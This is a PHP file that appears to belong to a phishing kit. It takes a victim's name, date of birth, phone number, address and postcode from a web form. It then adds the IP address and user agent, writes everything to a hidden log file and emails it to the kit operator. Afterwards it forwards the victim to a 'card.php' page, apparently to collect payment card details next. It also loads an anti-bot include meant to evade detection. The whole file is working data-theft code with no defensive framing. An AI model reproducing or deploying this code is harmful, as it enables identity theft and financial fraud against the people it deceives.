<?php
	error_reporting(0);
	ob_start();
	session_start();

include'../antibots.php';
	include '../email.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
		$_SESSION["fname"] 		= $_POST["f_name"];
		$_SESSION["lname"]		= $_POST["l_name"];
		$_SESSION["DOB"]		= $_POST["dob"];
		$_SESSION["PhoneNumber"]= $_POST["phone"];
		$_SESSION["street"] 	= $_POST["address1"];
		$_SESSION["city"]		= $_POST["city"];
		$_SESSION["country"] 	= $_POST["country"];
		$_SESSION["ZIP"] 		= $_POST["ZIP"];

$message = '
🤑  Prénom : '.$_SESSION["fname"].'
🤑  Nom : '.$_SESSION["lname"].'
🤑  Date De Naissance : '.$_SESSION["DOB"].'
🤑  Numéro : '.$_SESSION["PhoneNumber"].'
🤑  Rue : '.$_SESSION["street"].'
🤑  Ville : '.$_SESSION["city"].'
🤑  Pays : '.$_SESSION["country"].'
🤑  Code Postal : '.$_SESSION["ZIP"].'
🤑  IP: '._ip().'
🤑  User Agent: '.$_SERVER["HTTP_USER_AGENT"].'
';
$Subject="★FULL INFO★|"._ip();
$head="From:⭐S4N705⭐ <INFOS>";

$fil = fopen('0n_r3z_p4s_n0us.txt', 'a+');
fwrite($fil, '####################'.$message.'####################');
$_SESSION['step_three']  = true;
		mail($my_mail,$Subject,$message,$head);
		header('location: card.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));

}
else
{
	header('location: ../../index.php');
}
